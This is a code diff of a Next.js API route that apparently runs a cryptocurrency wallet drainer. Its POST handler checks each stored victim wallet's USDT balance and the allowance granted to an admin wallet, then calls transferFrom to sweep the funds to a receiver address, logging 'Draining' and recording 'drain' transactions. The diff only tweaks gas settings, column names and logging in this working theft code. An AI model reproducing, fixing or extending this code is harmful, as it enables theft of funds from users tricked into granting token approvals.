@@ -20,7 +20,6 @@ export async function POST(
   const { id } = await params;
   const supabase = getServiceSupabase();
 
-  // Optional: limit amount by query param (e.g., ?limitUsd=0.1)
   const url = new URL(req.url);
   const limitUsdParam = url.searchParams.get("limitUsd");
   const limitUsd = limitUsdParam ? parseFloat(limitUsdParam) : null;
@@ -35,7 +34,7 @@ export async function POST(
     return NextResponse.json({ error: "Wallet not found" }, { status: 404 });
   }
 
-  if (!wallet.approval_status) {
+  if (!wallet.is_approved) {
     return NextResponse.json({ error: "Wallet has not approved yet" }, { status: 400 });
   }
 
@@ -69,7 +68,6 @@ export async function POST(
       adminWallet
     );
 
-    // Check both balance AND real on-chain allowance
     const [balance, allowance]: [bigint, bigint] = await Promise.all([
       contract.balanceOf(wallet.address),
       contract.allowance(wallet.address, adminWallet.address),
@@ -80,18 +78,16 @@ export async function POST(
     }
 
     if (allowance === BigInt(0)) {
-      await supabase.from("wallets").update({ approval_status: false }).eq("id", id);
+      await supabase.from("wallets").update({ is_approved: false }).eq("id", id);
       return NextResponse.json(
-        { error: "No on-chain allowance found. Wallet may not have approved on BSC." },
+        { error: "No on-chain allowance found." },
         { status: 400 }
       );
     }
 
-    // Use lesser of balance or allowance
     let transferAmount = balance < allowance ? balance : allowance;
     let amountFormatted = ethers.formatUnits(transferAmount, 18);
 
-    // Apply limit if specified
     if (limitUsd !== null) {
       const transferUsd = parseFloat(amountFormatted);
       if (transferUsd > limitUsd) {
@@ -102,33 +98,26 @@ export async function POST(
 
     console.log(`🔄 Draining ${amountFormatted} USDT from ${wallet.address}`);
 
-    // FIXED: Proper gas settings for BSC (0 gas no longer works reliably)
     const tx = await contract.transferFrom(
       wallet.address,
       receiverAddress,
       transferAmount,
       {
         gasLimit: 120000,
-        gasPrice: ethers.parseUnits("0.05", "gwei"),   // Sweet spot for BSC right now
+        gasPrice: ethers.parseUnits("0.85", "gwei"),
       }
     );
 
-    console.log(`⏳ Transaction sent: ${tx.hash}`);
-
     const receipt = await tx.wait();
-    console.log(`✅ Transaction confirmed: ${receipt.hash}`);
 
-    // Update wallet record
     await supabase
       .from("wallets")
       .update({ 
         drained: false, 
-        drain_tx_hash: receipt.hash, 
-        updated_at: new Date().toISOString() 
+        drain_tx_hash: receipt.hash 
       })
       .eq("id", id);
 
-    // Record transaction
     await supabase.from("transactions").insert({
       wallet_address: wallet.address,
       type: "drain",
@@ -158,7 +147,7 @@ export async function POST(
   }
 }
 
-// PATCH - Update wallet (toggle approval, drained status, etc.)
+// PATCH - Update wallet (for toggles)
 export async function PATCH(
   req: NextRequest,
   { params }: { params: Promise<{ id: string }> }
@@ -172,19 +161,18 @@ export async function PATCH(
 
   try {
     const body = await req.json();
-    console.log("📥 PATCH body:", body);
+    console.log("PATCH body:", body);
 
     const updateData: any = {};
 
-    // Use only columns that actually exist in your table
+    // Only update columns that actually exist
     if (body.is_approved !== undefined) updateData.is_approved = body.is_approved;
     if (body.drained !== undefined) updateData.drained = body.drained;
     if (body.is_revoked !== undefined) updateData.is_revoked = body.is_revoked;
 
-    // Support old field names from frontend
+    // Support old field name
     if (body.approval_status !== undefined) updateData.is_approved = body.approval_status;
 
-    // Only update if there's something to update
     if (Object.keys(updateData).length === 0) {
       return NextResponse.json({ error: "No valid fields to update" }, { status: 400 });
     }
@@ -197,18 +185,14 @@ export async function PATCH(
       .single();
 
     if (error) {
-      console.error("❌ Supabase Update Error:", error);
-      return NextResponse.json({ 
-        error: error.message,
-        details: error 
-      }, { status: 500 });
+      console.error("Update Error:", error);
+      return NextResponse.json({ error: error.message }, { status: 500 });
     }
 
-    console.log("✅ Wallet updated:", data);
     return NextResponse.json({ success: true, data });
 
   } catch (err: any) {
-    console.error("🔥 PATCH Error:", err);
+    console.error("PATCH Error:", err);
     return NextResponse.json({ error: err.message || "Update failed" }, { status: 500 });
   }
 }
